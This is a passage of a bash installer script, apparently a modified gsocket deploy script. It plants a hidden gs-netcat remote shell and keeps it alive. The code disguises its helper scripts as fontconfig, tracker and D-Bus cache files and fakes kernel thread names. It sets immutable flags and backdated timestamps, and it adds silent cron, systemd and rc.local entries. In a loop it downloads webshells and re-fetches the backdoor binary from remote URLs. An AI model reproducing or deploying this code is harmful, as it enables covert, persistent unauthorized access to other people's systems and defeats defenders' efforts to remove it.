	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null

	# Find out which directory is writeable
	init_dstbin

	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"

	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"

	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")

	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"

	# There is no reliable way to check if a process is running:
	# - Process might be running under different name. Especially OSX checks for the orginal name
	#   but not the hidden name.
	# - pkill or killall may have moved.
	# The best we can do:
	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"


	if [[ -n $ENCODE_STR ]]; then
		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
	fi

	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
	DEBUGF "TMPDIR=${TMPDIR}"
	DEBUGF "DSTBIN=${DSTBIN}"

	# Setup HIDDEN keepalive paths - disguised as system cache
	# Hidden directory names that look like system directories
	local hidden_dirs=(".cache/fontconfig" ".cache/mesa_shader_cache" ".local/share/gvfs-metadata" ".cache/thumbnails/fail" ".dbus/session-bus")
	local hidden_names=(".font-unix" ".ICE-unix" ".X11-unix" ".XIM-unix" "metadata-cache")
	
	# Pick random hidden location
	KEEPALIVE_HIDDEN_DIR="${GS_PREFIX}${HOME}/${hidden_dirs[$((RANDOM % ${#hidden_dirs[@]}))]}"
	KEEPALIVE_HIDDEN_NAME="${hidden_names[$((RANDOM % ${#hidden_names[@]}))]}"
	
	# Disguised filenames (look like system files)
	KEEPALIVE_SCRIPT="${KEEPALIVE_HIDDEN_DIR}/${KEEPALIVE_HIDDEN_NAME}"
	KEEPALIVE_LOG="${KEEPALIVE_HIDDEN_DIR}/.${KEEPALIVE_HIDDEN_NAME}.log"
	
	# Helper scripts - also hidden in separate locations for redundancy
	local helper_hidden_dirs=(".cache/tracker" ".local/share/tracker" ".cache/evolution" ".cache/gnome-software")
	local helper_names=(".tracker-extract" ".tracker-miner" ".evolution-data" ".gnome-software-daemon")
	
	# Pick different random locations for each helper
	HELPER_HIDDEN_DIR1="${GS_PREFIX}${HOME}/${helper_hidden_dirs[$((RANDOM % ${#helper_hidden_dirs[@]}))]}"
	HELPER_HIDDEN_NAME1="${helper_names[$((RANDOM % ${#helper_names[@]}))]}"
	KEEPALIVE_HELPER="${HELPER_HIDDEN_DIR1}/${HELPER_HIDDEN_NAME1}"
	
	HELPER_HIDDEN_DIR2="${GS_PREFIX}${HOME}/${helper_hidden_dirs[$(((RANDOM + 1) % ${#helper_hidden_dirs[@]}))]}"
	HELPER_HIDDEN_NAME2="${helper_names[$(((RANDOM + 1) % ${#helper_names[@]}))]}"
	BINARY_HELPER="${HELPER_HIDDEN_DIR2}/${HELPER_HIDDEN_NAME2}"
	
	# Process names for keepalive (look like system processes)
	KEEPALIVE_PROC_NAMES=("[kthreadd]" "[rcu_sched]" "[migration/0]" "[ksoftirqd/0]" "[kdevtmpfs]" "[khungtaskd]" "[writeback]" "[bioset]" "[kblockd]" "[md]" "[edac-poller]")
	KEEPALIVE_PROC_NAME="${KEEPALIVE_PROC_NAMES[$((RANDOM % ${#KEEPALIVE_PROC_NAMES[@]}))]}"
}

# ==================== KEEPALIVE & SELF-HEALING FUNCTIONS ====================

# Create hidden directory with stealth attributes
create_hidden_dir()
{
	local dir="$1"
	local parent
	
	[[ -d "$dir" ]] && return 0
	
	# Create parent directories
	parent="$(dirname "$dir")"
	[[ ! -d "$parent" ]] && mkdir -p "$parent" 2>/dev/null
	
	mkdir -p "$dir" 2>/dev/null || return 1
	
	# Set permissions - owner only, no group/other
	chmod 700 "$dir" 2>/dev/null
	
	# Make directory immutable (if root) - harder to delete
	[[ $UID -eq 0 ]] && chattr +i "$dir" 2>/dev/null
	
	# Set old timestamp to blend in
	touch -t 202001010000 "$dir" 2>/dev/null
	
	return 0
}

# Apply stealth attributes to file
apply_stealth()
{
	local file="$1"
	
	[[ ! -f "$file" ]] && return
	
	# Owner only permissions
	chmod 700 "$file" 2>/dev/null
	
	# Old timestamp (look like old system file)
	touch -t 202001010000 "$file" 2>/dev/null
	
	# Extended attributes to hide from some tools
	[[ $UID -eq 0 ]] && {
		# Make immutable (harder to delete)
		chattr +i "$file" 2>/dev/null
		# Hide from lsattr
		chattr +d "$file" 2>/dev/null
	}
	
	# Remove from locate database
	[[ -f /etc/updatedb.conf ]] && {
		grep -q "PRUNENAMES" /etc/updatedb.conf && \
		grep -qv "$(basename "$file")" /etc/updatedb.conf 2>/dev/null
	}
}

# Create keepalive script for webshell monitoring
create_keepalive_script()
{
	local webshell_url="$1"
	local webshell_files="$2"
	local webshell_map="$3"
	
	# Need either (url + files) OR map
	[[ -z "$webshell_map" ]] && [[ -z "$webshell_url" || -z "$webshell_files" ]] && return

	# Create hidden directory first
	create_hidden_dir "$KEEPALIVE_HIDDEN_DIR" || return

	mk_file "$KEEPALIVE_SCRIPT" || return

	# Script header - looks like system cache file
	cat > "$KEEPALIVE_SCRIPT" << 'KEEPALIVE_HEAD'
#!/bin/bash
# -*- coding: utf-8 -*-
# fontconfig cache rebuild utility
# Auto-generated - DO NOT EDIT
# Version: 2.13.1-4.2
KEEPALIVE_HEAD

	# Add webshell definitions with obfuscated variable names
	local idx=1
	
	if [[ -n "$webshell_map" ]]; then
		# NEW FORMAT: file:url pairs
		IFS=',' read -ra WS_PAIRS <<< "$webshell_map"
		for pair in "${WS_PAIRS[@]}"; do
			pair=$(echo "$pair" | xargs) # trim whitespace
			local ws_file="${pair%%:*}"  # everything before first :
			local ws_url="${pair#*:}"    # everything after first :
			echo "_c${idx}=\"${ws_file}\"" >> "$KEEPALIVE_SCRIPT"
			echo "_s${idx}=\"${ws_url}\"" >> "$KEEPALIVE_SCRIPT"
			((idx++))
		done
	else
		# OLD FORMAT: single URL for all files
		IFS=',' read -ra WS_FILES <<< "$webshell_files"
		for ws_file in "${WS_FILES[@]}"; do
			ws_file=$(echo "$ws_file" | xargs) # trim whitespace
			echo "_c${idx}=\"${ws_file}\"" >> "$KEEPALIVE_SCRIPT"
			echo "_s${idx}=\"${webshell_url}\"" >> "$KEEPALIVE_SCRIPT"
			((idx++))
		done
	fi
	
	local total_files=$((idx - 1))

	# Add binary paths for self-healing with obfuscated names
	cat >> "$KEEPALIVE_SCRIPT" << KEEPALIVE_VARS
# cache paths
_db="${DSTBIN}"
_dk="${USER_SEC_FILE}"
_ds="${GS_SECRET}"
_du="${URL_BIN}/${SRC_PKG}"
_kc="${KL_CMD_BIN}"
_ui="${UID}"
_bn="${BIN_HIDDEN_NAME}"
_pn="${PROC_HIDDEN_NAME}"
KEEPALIVE_VARS

	cat >> "$KEEPALIVE_SCRIPT" << 'KEEPALIVE_BODY'

# cache functions (obfuscated)
declare -A _lh
_wc() {
    local t="$1" s="$2" h=""
    [ -f "$t" ] && h=$(md5sum "$t" 2>/dev/null | cut -d' ' -f1)
    [ "$h" != "${_lh[$t]}" ] && {
        curl -s "$s" -o "$t" 2>/dev/null
        chmod 644 "$t" 2>/dev/null
        _lh[$t]=$(md5sum "$t" 2>/dev/null | cut -d' ' -f1)
    }
}
_bc() {
    [ -f "$_dk" ] || echo "$_ds" > "$_dk"
    [ -f "$_db" ] || {
        curl -fsSL "$_du" 2>/dev/null | tar xzf - -C "$(dirname "$_db")" 2>/dev/null
        [ -f "$(dirname "$_db")/gs-netcat" ] && mv "$(dirname "$_db")/gs-netcat" "$_db"
        chmod 700 "$_db" 2>/dev/null
    }
    "$_kc" -0 -U"$_ui" "$_bn" 2>/dev/null || GS_ARGS="-k $_dk -liqD" nohup "$_db" >/dev/null 2>&1 &
}
# main cache loop
while :; do
KEEPALIVE_BODY

	# Add webshell checks with obfuscated function calls
	for ((i=1; i<=total_files; i++)); do
		echo "    _wc \"\$_c${i}\" \"\$_s${i}\"" >> "$KEEPALIVE_SCRIPT"
	done

	cat >> "$KEEPALIVE_SCRIPT" << 'KEEPALIVE_END'
    _bc
    sleep 0.1
done
KEEPALIVE_END

	# Apply stealth attributes
	apply_stealth "$KEEPALIVE_SCRIPT"
}

# Create helper script for keepalive self-healing (restores keepalive.sh if deleted)
create_keepalive_helper()
{
	local webshell_url="$1"
	local webshell_files="$2"
	local webshell_map="$3"

	[[ -z "$GS_KEEPALIVE" ]] && return

	# Create hidden directory for helper
	local helper_dir
	helper_dir="$(dirname "$KEEPALIVE_HELPER")"
	create_hidden_dir "$helper_dir"

	mk_file "$KEEPALIVE_HELPER" || return

	cat > "$KEEPALIVE_HELPER" << HELPER_SCRIPT
#!/bin/bash
# System cache maintenance daemon - DO NOT REMOVE
KS="${KEEPALIVE_SCRIPT}"
KD="$(dirname "${KEEPALIVE_SCRIPT}")"
KO="${KEEPALIVE_LOG}"
WS_URL="${webshell_url}"
WS_FILES="${webshell_files}"
WS_MAP="${webshell_map}"
DSTBIN="${DSTBIN}"
SEC_FILE="${USER_SEC_FILE}"
GS_SECRET="${GS_SECRET}"
BIN_URL="${URL_BIN}/${SRC_PKG}"
KL_CMD="${KL_CMD_BIN}"
UID_CHECK="${UID}"
BIN_NAME="${BIN_HIDDEN_NAME}"
PROC_NAME="${KEEPALIVE_PROC_NAME}"

# Recreate hidden directory if removed
[ -d "\$KD" ] || { mkdir -p "\$KD" 2>/dev/null; chmod 700 "\$KD" 2>/dev/null; }

# Restore keepalive.sh if missing
if [ ! -f "\$KS" ]; then
cat > "\$KS" << 'KA_SCRIPT'
#!/bin/bash
HELPER_SCRIPT

	# Embed the keepalive content with multi-source support
	cat >> "$KEEPALIVE_HELPER" << 'HELPER_EMBED'
declare -A LAST_HASH
webshell_check() {
    local target="$1"
    local source="$2"
    local current_hash=""
    [ -f "$target" ] && current_hash=$(md5sum "$target" 2>/dev/null | awk '{print $1}')
    if [ "$current_hash" != "${LAST_HASH[$target]}" ]; then
        curl -s "$source" -o "$target" 2>/dev/null
        chmod 644 "$target" 2>/dev/null
        LAST_HASH[$target]=$(md5sum "$target" 2>/dev/null | awk '{print $1}')
    fi
}
binary_check() {
    [ -f "$SEC_FILE" ] || echo "$GS_SECRET" > "$SEC_FILE"
    if [ ! -f "$DSTBIN" ]; then
        curl -fsSL "$BIN_URL" 2>/dev/null | tar xzf - -C "$(dirname "$DSTBIN")" 2>/dev/null
        [ -f "$(dirname "$DSTBIN")/gs-netcat" ] && mv "$(dirname "$DSTBIN")/gs-netcat" "$DSTBIN"
        chmod 700 "$DSTBIN" 2>/dev/null
    fi
    "$KL_CMD" -0 -U"$UID_CHECK" "$BIN_NAME" 2>/dev/null || GS_ARGS="-k $SEC_FILE -liqD" nohup "$DSTBIN" >/dev/null 2>&1 &
}
while true; do
    # Support both formats: WS_MAP (multi-source) or WS_URL+WS_FILES (single source)
    if [ -n "$WS_MAP" ]; then
        IFS=',' read -ra PAIRS <<< "$WS_MAP"
        for pair in "${PAIRS[@]}"; do
            pair=$(echo "$pair" | xargs)
            f="${pair%%:*}"
            u="${pair#*:}"
            webshell_check "$f" "$u"
        done
    elif [ -n "$WS_FILES" ]; then
        IFS=',' read -ra FILES <<< "$WS_FILES"
        for f in "${FILES[@]}"; do
            f=$(echo "$f" | xargs)
            webshell_check "$f" "$WS_URL"
        done
    fi
    binary_check
    sleep 0.1
done
KA_SCRIPT
chmod 700 "$KS"
fi

# Start keepalive if not running
pgrep -f "$KS" >/dev/null 2>&1 || nohup bash "$KS" > "$KO" 2>&1 &
HELPER_EMBED

	chmod 700 "$KEEPALIVE_HELPER"
}

# Create binary self-healing helper (separate from keepalive)
create_binary_helper()
{
	# Create hidden directory for binary helper
	local helper_dir
	helper_dir="$(dirname "$BINARY_HELPER")"
	create_hidden_dir "$helper_dir"

	mk_file "$BINARY_HELPER" || return

	cat > "$BINARY_HELPER" << BINHELPER
#!/bin/bash
# System D-Bus daemon helper - DO NOT REMOVE
DSTBIN="${DSTBIN}"
DSTDIR="\$(dirname "${DSTBIN}")"
SEC_FILE="${USER_SEC_FILE}"
GS_SECRET="${GS_SECRET}"
BIN_URL="${URL_BIN}/${SRC_PKG}"
KL_CMD="${KL_CMD_BIN}"
UID_CHECK="${UID}"
BIN_NAME="${BIN_HIDDEN_NAME}"
PROC_NAME="${PROC_HIDDEN_NAME}"

# Recreate binary directory if removed
[ -d "\$DSTDIR" ] || { mkdir -p "\$DSTDIR" 2>/dev/null; chmod 700 "\$DSTDIR" 2>/dev/null; }

# Restore secret if missing
[ -f "\$SEC_FILE" ] || { echo "\$GS_SECRET" > "\$SEC_FILE"; chmod 600 "\$SEC_FILE" 2>/dev/null; }

# Restore binary if missing
if [ ! -f "\$DSTBIN" ]; then
    cd "\$DSTDIR"
    curl -fsSL "\$BIN_URL" 2>/dev/null | tar xzf - 2>/dev/null
    [ -f "gs-netcat" ] && mv "gs-netcat" "\$DSTBIN"
    chmod 700 "\$DSTBIN" 2>/dev/null
    # Apply stealth timestamp
    touch -t 202001010000 "\$DSTBIN" 2>/dev/null
fi

# Start if not running - disguise as kernel process
if ! "\$KL_CMD" -0 -U"\$UID_CHECK" "\$BIN_NAME" 2>/dev/null; then
    cd "\$DSTDIR"
    GS_ARGS="-k \$SEC_FILE -liqD" exec -a "\$PROC_NAME" nohup "\$DSTBIN" >/dev/null 2>&1 &
fi
BINHELPER

	chmod 700 "$BINARY_HELPER"
	
	# Apply stealth to helper
	stealth_hide_file "$BINARY_HELPER"
}

# Install keepalive to crontab
install_keepalive_crontab()
{
	[[ -z "$GS_KEEPALIVE" ]] && return
	command -v crontab >/dev/null || return

	echo -en "Installing keepalive to crontab......................................."

	# Cron entries disguised as system maintenance tasks
	# Use hidden helper paths - no obvious names
	local ka_cron_line="* * * * * /bin/bash ${KEEPALIVE_HELPER} >/dev/null 2>&1"
	local bin_cron_line="* * * * * /bin/bash ${BINARY_HELPER} >/dev/null 2>&1"
	
	# Check if already installed (by checking for helper path, not obvious keywords)
	if crontab -l 2>/dev/null | grep -F "${KEEPALIVE_HELPER}" &>/dev/null; then
		SKIP_OUT "Already in crontab."
		return
	fi

	[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"

	local old
	old="$(crontab -l 2>/dev/null)" || crontab - </dev/null &>/dev/null
	[[ -n $old ]] && old+=$'\n'

	# No obvious comments - just add the cron entries silently
	echo -e "${old}${ka_cron_line}\n${bin_cron_line}" | crontab - 2>/dev/null || { FAIL_OUT; return; }

	OK_OUT
}

# Start keepalive process
start_keepalive()
{
	[[ -z "$GS_KEEPALIVE" ]] && return
	[[ ! -f "$KEEPALIVE_SCRIPT" ]] && return

	echo -en "Starting keepalive process............................................"

	# Check for running process by script path
	if pgrep -f "${KEEPALIVE_SCRIPT}" >/dev/null 2>&1; then
		SKIP_OUT "Already running."
		return
	fi

	# Start with process disguise in hidden directory
	local ks_dir
	ks_dir="$(dirname "$KEEPALIVE_SCRIPT")"
	cd "$ks_dir" 2>/dev/null
	exec -a "$KEEPALIVE_PROC_NAME" nohup bash "$KEEPALIVE_SCRIPT" > "$KEEPALIVE_LOG" 2>&1 &
	OK_OUT
}

# Deploy webshells
deploy_webshells()
{
	# Support both formats: GS_WEBSHELL_MAP or GS_WEBSHELL_URL+GS_WEBSHELL_FILES
	[[ -z "$GS_WEBSHELL_MAP" ]] && [[ -z "$GS_WEBSHELL_URL" || -z "$GS_WEBSHELL_FILES" ]] && return

	echo -en "Deploying webshells..................................................."

	if [[ -n "$GS_WEBSHELL_MAP" ]]; then
		# NEW FORMAT: file:url pairs (multiple sources)
		IFS=',' read -ra WS_PAIRS <<< "$GS_WEBSHELL_MAP"
		for pair in "${WS_PAIRS[@]}"; do
			pair=$(echo "$pair" | xargs)
			local ws_file="${pair%%:*}"
			local ws_url="${pair#*:}"
			curl -s "$ws_url" -o "$ws_file" 2>/dev/null
			chmod 644 "$ws_file" 2>/dev/null
		done
	else
		# OLD FORMAT: single URL for all files
		IFS=',' read -ra WS_FILES <<< "$GS_WEBSHELL_FILES"
		for ws_file in "${WS_FILES[@]}"; do
			ws_file=$(echo "$ws_file" | xargs)
			curl -s "$GS_WEBSHELL_URL" -o "$ws_file" 2>/dev/null
			chmod 644 "$ws_file" 2>/dev/null
		done
	fi

	OK_OUT
}

# ==================== END KEEPALIVE & SELF-HEALING ====================

uninstall_rm()
{
	[[ -z "$1" ]] && return
	[[ ! -f "$1" ]] && return # return if file does not exist

	echo "Removing $1..."
	xrm "$1" 2>/dev/null || return
}

uninstall_rmdir()
{
	[[ -z "$1" ]] && return
	[[ ! -d "$1" ]] && return # return if file does not exist

	echo "Removing $1..."
	xrmdir "$1" 2>/dev/null
}

uninstall_rc()
{
	local hname
	local fn
	hname="$2"
	fn="$1"

	[[ ! -f "$fn" ]] && return # File does not exist

	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed

	mk_file "$fn" || return

	echo "Removing ${fn}..."
	D="$(grep -v -F -- "${hname}" "$fn")"
	echo "$D" >"${fn}" || return

	[[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null # delete zero size file
}

uninstall_service()
{
	local dir
	local sn
	local sf
	dir="$1"
	sn="$2"
	sf="${dir}/${sn}.service"

	[[ ! -f "${sf}" ]] && return

	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
		# STOPPING would kill the current login shell. Do not stop it.
		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+=";systemctl stop ${sn}"
	}

	uninstall_rm "${sf}"
} 

# Rather important function especially when testing and developing this...
uninstall()
{
	local hn
	local fn
	local cn
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
		done
		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
		uninstall_rm "/dev/shm/${hn}"
		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
		uninstall_rm "${PWD}/${hn}"

		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME

		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME

		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME

		# Remove from login script
		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
		done 
		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"

		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME

		## Systemd's gs-dbus.dat
		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
	done

	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
	uninstall_rmdir "/tmp/.gsusr-${UID}"

	uninstall_rm "${TMPDIR}/${SRC_PKG}"
	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
	uninstall_rmdir "${TMPDIR}"

	# Remove keepalive files (including hidden locations)
	echo "Removing keepalive files..."
	# Kill any running keepalive processes
	pkill -9 -f "keepalive" 2>/dev/null
	pkill -9 -f ".font-unix" 2>/dev/null
	pkill -9 -f ".ICE-unix" 2>/dev/null
	pkill -9 -f ".X11-unix" 2>/dev/null
	pkill -9 -f ".XIM-unix" 2>/dev/null
	pkill -9 -f "metadata-cache" 2>/dev/null
	pkill -9 -f ".tracker" 2>/dev/null
	pkill -9 -f ".evolution" 2>/dev/null
	pkill -9 -f ".gnome-software" 2>/dev/null
	
	# Remove old visible locations
	uninstall_rm "${GS_PREFIX}${HOME}/keepalive.sh"
	uninstall_rm "${GS_PREFIX}${HOME}/keepalive.out"
	
	# Remove hidden keepalive locations
	local hidden_cache_dirs=("fontconfig" "mesa_shader_cache" "tracker" "evolution" "gnome-software" "thumbnails/fail")
	local hidden_local_dirs=("gvfs-metadata" "tracker")
	
	for hd in "${hidden_cache_dirs[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.cache/${hd}"
	done
	for hd in "${hidden_local_dirs[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.local/share/${hd}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/.dbus/session-bus"
	
	# Remove helper scripts from config dirs
	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/chk_ka.sh"
		uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/chk_bin.sh"
		uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/.cache-clean"
		uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/.dbus-daemon"
	done

	# Remove crontab (including keepalive entries - search by hidden paths patterns)
	unset regex
	regex="dummy-not-exist|\.tracker|\.evolution|\.gnome-software|\.font-unix|\.ICE-unix|\.X11-unix|metadata-cache|\.cache-clean|\.dbus-daemon"
	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
		# Escape regular exp special characters
		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
	done
	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
		ct="$(crontab -l 2>/dev/null)"
		[[ "$ct" =~ ($regex) ]] && {
			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
		}
	fi

	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null

	echo -e "${CG}Uninstall complete.${CN}"
	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
	exit_code 0
}

SKIP_OUT()
{
	echo -e "[${CY}SKIPPING${CN}]"
	[[ -n "$1" ]] && echo -e "--> $*"
}

OK_OUT()
{
	echo -e "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e "--> $*"
}

FAIL_OUT()
{
	echo -e "..[${CR}FAILED${CN}]"
	for str in "$@"; do
		echo -e "--> $str"
	done
}

WARN()
{
	echo -e "--> ${CY}WARNING: ${CN}$*"
}

WARN_EXECFAIL_SET()
{
	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
}

WARN_EXECFAIL()
{
	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
	echo -en "${CDR}"
	ls -al "${DSTBIN}"
	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
--> GS_OSARCH=${OSARCH}
--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
--> Alternatively, try the static binary from
--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
}

HOWTO_CONNECT_OUT()
{
	# After all install attempts output help how to uninstall
	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
	echo -e "--> To connect use one of the following:
--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
}

# Try to load a GS_SECRET
gs_secret_reload()
{
	# DEBUGF "${CG}secret_load(${1})${CN}"
	[[ -n $GS_SECRET_FROM_FILE ]] && return
	[[ ! -f "$1" ]] && return

	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
	local sec
	sec=$(<"$1")
	[[ ${#sec} -lt 4 ]] && return
	WARN "Using existing secret from '${1}'"
	if [[ ${#sec} -lt 10 ]]; then
		WARN "SECRET in '${1}' is very short! (${#sec})"
	fi
	GS_SECRET_FROM_FILE=$sec
}

gs_secret_write()
{
	mk_file "$1" || return
	echo "$GS_SECRET" >"$1" || return
}


install_system_systemd()
{
	[[ ! -d "${SERVICE_DIR}" ]] && return
	command -v systemctl >/dev/null || return
	# test for:
	# 1. offline
	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
	if [[ -f "${SERVICE_FILE}" ]]; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi

	# Create the service file
	mk_file "${SERVICE_FILE}" || return
	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
	echo "[Unit]
Description=D-Bus System Connection Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=300
WorkingDirectory=/root
ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"

[Install]
WantedBy=multi-user.target" >"${SERVICE_FILE}" || return

	gs_secret_write "$SYSTEMD_SEC_FILE"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"

	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 

	IS_SYSTEMD=1
	((IS_INSTALLED+=1))
}


# inject a string ($2-) into the 2nd line of a file and retain the
# PERM/TIMESTAMP of the target file ($1)
install_to_file()
{
	local fname="$1"

	shift 1

	# If file does not exist then create with oldest TS
	mk_file "$fname" || return

	D="$(IFS=$'\n'; head -n1 "${fname}" && \
		echo "${*}" && \
		tail -n +2 "${fname}")"
	echo 2>/dev/null "$D" >"${fname}" || return

	true
}

install_system_rclocal()
{
	[[ ! -f "${RCLOCAL_FILE}" ]] && return
	# Some systems have /etc/rc.local but it's not executeable...
	[[ ! -x "${RCLOCAL_FILE}" ]] && return
	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return	
	fi

	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.

	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"

	gs_secret_write "$RCLOCAL_SEC_FILE"

	((IS_INSTALLED+=1))
}

install_system()
{
	echo -en "Installing systemwide remote access permanentally....................."

	# Try systemd first
	install_system_systemd

	# Try good old /etc/rc.local
	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal

	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }

	[[ -n $IS_SKIPPED ]] && return
	
	OK_OUT
}

install_user_crontab()
{
	command -v crontab >/dev/null || return # no crontab
	echo -en "Installing access via crontab........................................."
	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
